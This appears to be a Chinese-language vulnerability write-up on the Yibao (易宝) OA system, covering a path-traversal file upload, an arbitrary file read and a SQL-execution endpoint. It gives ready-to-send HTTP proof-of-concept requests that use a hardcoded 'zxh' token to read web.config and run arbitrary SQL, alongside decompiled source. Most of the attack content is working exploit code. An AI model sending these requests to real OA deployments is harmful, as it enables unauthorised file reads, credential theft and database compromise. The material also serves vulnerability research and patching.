## 易宝oa

### BasicService文件上传漏洞

首先会有一个webservicePassword的判断条件

```
	if (!(webservicePassword == GetWebServicePassword()))
```

webservicePassword存放于web.config中，<add *key*="WebServicePassword" *value*="xxxx"/>

在判断之后将PersonalDocumentUpLoadPath和filename拼接后进入if (File.Exists(path))判断

personalDocumentuploadpath默认为Topvision\SmartTradeServer\UpLoadPath\PersonalDocument

直接fs传入字节数组，filename为../../xxxx/xxx.xxx即可



### DownloadFile文件读取复现

网上poc如下

```
POST /api/files/DownloadFile HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0
Content-Length: 94
Accept-Encoding: gzip
Content-Type: application/x-www-form-urlencoded

token=zxh&requestFileName=../../manager/web.config&pathType=1
```

查看源码之后发现首先有个if语句，当为null时返回token不能为空或已过期

```
public ReturnResult<byte[]> DownloadFile(string requestFileName, int pathType)
{
	if (IsAuthorityCheck() == null)
	{
		return new ReturnResult<byte[]>("token不能为空或已过期");
	}
	requestFileName = getByValue("requestFileName");
	pathType = int.Parse(getByValue("pathType"));
	return SingleBase<fileServices>.get_Instance().DownloadFile(requestFileName, pathType);
}
```

跟进查看可知token要为zxh

```
public UserInfo IsAuthorityCheck()
{
	string byValue = getByValue("token");
	if (string.IsNullOrWhiteSpace(byValue))
	{
		return null;
	}
	if (byValue == "zxh")
	{
		return new UserInfo();
	}
```



### ExecuteSqlForSingle sql注入 

```
POST /api/system/ExecuteSqlForSingle HTTP/1.1
Host: IP:PORT
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Content-Length: 103

token=zxh&sql=select substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)&strParameters
```

